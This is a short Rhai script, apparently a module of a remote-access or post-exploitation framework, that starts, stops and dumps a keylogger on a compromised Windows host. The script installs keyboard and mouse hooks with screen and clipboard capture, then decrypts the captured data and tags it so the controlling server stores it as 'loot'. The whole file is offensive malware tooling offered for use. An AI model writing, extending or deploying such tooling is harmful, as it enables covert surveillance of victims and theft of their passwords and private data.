// klog.rhai - keylogger control helper.
//
// Usage: klog <start|stop|dump|status>
//   start  - install the low-level key/mouse hook + screen/clipboard capture
//   stop   - remove the hook
//   dump   - decrypt and return everything captured so far; the
//            KEYLOG_DUMP: marker makes the server save it to loot
//   status - probe for captured data (there is no explicit is-running API;
//            this is stated rather than faked)
//
// The hook itself is Windows-only; the API already answers "Not supported"
// elsewhere and this script surfaces that answer unchanged.

if args.len() < 1 {
    return "Usage: klog <start|stop|dump|status>";
}
let cmd = args[0];

if cmd == "start" {
    let r = internal_keylog_start();
    print_log("klog start: " + r);
    return r;
}

if cmd == "stop" {
    let r = internal_keylog_stop();
    print_log("klog stop: " + r);
    return r;
}

if cmd == "dump" {
    let data = internal_keylog_dump();
    if data == "" {
        return "klog: no captured data (keylogger not started, or nothing logged yet)";
    }
    // data already carries the KEYLOG_DUMP: prefix -> server saves to loot.
    return data;
}

if cmd == "status" {
    let data = internal_keylog_dump();
    if data == "" {
        return "klog: no captured data on disk or in memory";
    }
    return "klog: captured data present (" + data.len + " bytes); run klog dump to retrieve";
}

return "Usage: klog <start|stop|dump|status>";
